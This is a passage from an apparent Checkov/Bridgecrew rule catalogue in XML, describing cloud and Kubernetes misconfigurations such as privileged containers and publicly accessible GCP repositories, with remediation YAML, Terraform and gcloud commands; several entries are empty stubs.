    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="privileged-containers-are-admitted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-privileged-containers-are-admitted"></div>Privileged containers are admitted</div><a aria-label="Skip link to Privileged containers are admitted" class="heading-anchor-icon fa fa-anchor" href="#privileged-containers-are-admitted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Privileged containers are containers that have all of the root capabilities of a host machine, allowing  access to resources that are not accessible in ordinary containers. </p>
<p>Running a container with a privileged flag allows users to have critical access to the host&#8217;s resources. If a privileged container is compromised, it does not necessarily entail remote code execution, but it implies that an attacker will be able to run full host root with all of the available capabilities, including  CAP_SYS_ADMIN.</p>
<p>Common uses of privileged containers include: running a Docker daemon inside a Docker container, running a container with direct hardware access, and automating CI/CD tasks in the open-source automation server Jenkins.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Argument</strong>: privileged (Optional)<br/>
When set to false, containers are unable to run processes that are essentially equivalent to root on the host.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
+ privileged: false
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource, the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>A <strong>Role</strong> or <strong>ClusterRole</strong> must grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole</strong> is then bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_77</key>
    <name>Ensure GCP Google compute firewall ingress does not allow FTP port (20) access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-google-compute-firewall-ingress-allows-ftp-port-20-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-google-compute-firewall-ingress-allows-ftp-port-20-access"></div>GCP Google compute firewall ingress allows FTP port (20) access</div><a aria-label="Skip link to GCP Google compute firewall ingress allows FTP port (20) access" class="heading-anchor-icon fa fa-anchor" href="#gcp-google-compute-firewall-ingress-allows-ftp-port-20-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-ftp-port-20-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-ftp-port-20-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-ftp-port-20-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_136</key>
    <name>Ensure Azure PostgreSQL Flexible Server enables geo-redundant backups</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-flexible-server-does-not-enable-geo-redundant-backups"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-flexible-server-does-not-enable-geo-redundant-backups"></div>Azure PostgreSQL Flexible Server does not enable geo-redundant backups</div><a aria-label="Skip link to Azure PostgreSQL Flexible Server does not enable geo-redundant backups" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-flexible-server-does-not-enable-geo-redundant-backups"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_101</key>
    <name>Ensure GCP Artifact Registry repositories are not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-artifact-registry-repositories-are-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-artifact-registry-repositories-are-anonymously-or-publicly-accessible"></div>GCP Artifact Registry repositories are anonymously or publicly accessible</div><a aria-label="Skip link to GCP Artifact Registry repositories are anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#gcp-artifact-registry-repositories-are-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>Artifact Registry</strong> is a service that stores artifacts and build dependencies for your GCP applications. Artifact registry repositories can contain sensitive credentials that are baked into containers, personal data (like PII), or confidential data that you may not want publicly accessible. Repositories can be made anonymously or publicly accessible via IAM policies containing the IAM members <em>allUsers</em> or <em>allAuthenticatedUsers</em>.</p>
<p>We recommend you ensure that neither anonymous or public access to <strong>Artifact Registry repositories</strong> is allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To remove anonymous or public access for your Artifact Registry repository:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/artifacts" target="_self">Repositories</a>.</li>
<li>Select the target <strong>Artifact Registry</strong> repository.</li>
<li>Expand the <em>Info Panel</em> by selecting <strong>Show Info Panel</strong>.</li>
<li>To remove a specific role assignment, select <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong>, and then click <strong>Remove member</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove anonymous or public access for your Artifact Registry repositories use the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud artifacts repositories remove-iam-policy-binding REPOSITORY  \
  --member=MEMBER  \
  --role=ROLE
</code></pre></div></div>
<p>Replace <strong>REPOSITORY</strong> with your repository ID. Replace <strong>MEMBER</strong> with <em>allUsers</em> or <em>allAuthenticatedUsers</em> depending on your Checkov alert. Replace <strong>ROLE</strong> with the member's role.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_artifact_registry_repository_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
<li>
<p><strong>Resource</strong>: google_storage_bucket_iam_member</p>
</li>
<li>
<p><strong>Field</strong>: member</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_artifact_registry_repository_iam_binding" "public_binding" {
  provider = google-beta
  location = google_artifact_registry_repository.my-repo.location
  repository = google_artifact_registry_repository.my-repo.name
  role = "roles/artifactregistry.writer"

  members = [
-    "allUsers",
-    "allAuthenticatedUsers",
  ]
}
</code></pre></div></div>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_artifact_registry_repository_iam_member" "public_member" {
  provider = google-beta
  location = google_artifact_registry_repository.my-repo.location
  repository = google_artifact_registry_repository.my-repo.name
  role = "roles/artifactregistry.writer"

-  member = "allUsers"
-  member = "allAuthenticatedUsers"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repository-is-not-anonymously-or-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repository-is-not-anonymously-or-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repository-is-not-anonymously-or-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_31</key>
    <name>Ensure Alibaba Cloud Kubernetes node pools are set to auto repair</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-kubernetes-node-pools-are-not-set-to-auto-repair"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-kubernetes-node-pools-are-not-set-to-auto-repair"></div>Alibaba Cloud Kubernetes node pools are not set to auto repair</div><a aria-label="Skip link to Alibaba Cloud Kubernetes node pools are not set to auto repair" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-kubernetes-node-pools-are-not-set-to-auto-repair"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-node-pools-are-set-to-auto-repair' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-node-pools-are-set-to-auto-repair</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-node-pools-are-set-to-auto-repair' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_19</key>
    <name>Ensure OCI security list does not allow ingress from 0.0.0.0/0 to port 22</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-security-list-allows-ingress-from-00000-to-port-22"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-security-list-allows-ingress-from-0-0-0-0-0-to-port-22"></div>OCI security list allows ingress from 0.0.0.0/0 to port 22</div><a aria-label="Skip link to OCI security list allows ingress from 0.0.0.0/0 to port 22" class="heading-anchor-icon fa fa-anchor" href="#oci-security-list-allows-ingress-from-00000-to-port-22"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-22' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_160</key>
    <name>Ensure Azure HTTP (port 80) access from the internet is restricted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-http-port-80-access-from-the-internet-is-not-restricted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-http-port-80-access-from-the-internet-is-not-restricted"></div>Azure HTTP (port 80) access from the internet is not restricted</div><a aria-label="Skip link to Azure HTTP (port 80) access from the internet is not restricted" class="heading-anchor-icon fa fa-anchor" href="#azure-http-port-80-access-from-the-internet-is-not-restricted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-http-port-80-access-from-the-internet-is-restricted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-http-port-80-access-from-the-internet-is-restricted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-http-port-80-access-from-the-internet-is-restricted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_248</key>
    <name>Ensure AWS Elasticsearch does not use the default security group</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticsearch-uses-the-default-security-group"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticsearch-uses-the-default-security-group"></div>AWS Elasticsearch uses the default security group</div><a aria-label="Skip link to AWS Elasticsearch uses the default security group" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticsearch-uses-the-default-security-group"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-does-not-use-the-default-security-group' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-does-not-use-the-default-security-group</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-does-not-use-the-default-security-group' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_242</key>
    <name>Ensure AWS MWAA environment has scheduler logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mwaa-environment-has-scheduler-logs-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mwaa-environment-has-scheduler-logs-disabled"></div>AWS MWAA environment has scheduler logs disabled</div><a aria-label="Skip link to AWS MWAA environment has scheduler logs disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-mwaa-environment-has-scheduler-logs-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-scheduler-logs-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-scheduler-logs-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-scheduler-logs-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_98</key>
    <name>Ensure GCP Dataproc cluster is not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-dataproc-cluster-is-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-dataproc-cluster-is-anonymously-or-publicly-accessible"></div>GCP Dataproc cluster is anonymously or publicly accessible</div><a aria-label="Skip link to GCP Dataproc cluster is anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#gcp-dataproc-cluster-is-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Dataproc is commonly used for data lake modernization, ETL, and data science workloads. A Dataproc cluster contains at least one "management" VM and one "compute" VM. Access to Dataproc clusters is controlled via IAM policies. These IAM policies can be set for public access via the <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong> IAM principals which can inadvertently expose your data to the public.</p>
<p>We recommend you ensure anonymous and public access to Dataproc clusters is not allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To remove anonymous or public access for Dataproc clusters:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/dataproc/clusters" target="_self">Clusters</a>.</li>
<li>Select the target <strong>Dataproc cluster</strong>.</li>
<li>Expand the <em>Info Panel</em> by selecting <strong>Show Info Panel</strong>.</li>
<li>To remove a specific role assignment, select <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong>, and then click <strong>Remove member</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove access for <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, you need to first get the Dataproc cluster's existing IAM policy. To retrieve the existing policy and copy it to a local file:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud dataproc clusters get-iam-policy CLUSTER-ID  \
  --format json &gt; policy.json
</code></pre></div></div>
<p>Replace <strong>CLUSTER-ID</strong> with your Dataproc cluster ID.</p>
<p>Next, locate and remove the IAM bindings with either <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong> depending on your Checkov error. After modifying the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">policy.json</code> file, update the Dataproc cluster with the following command:</p>
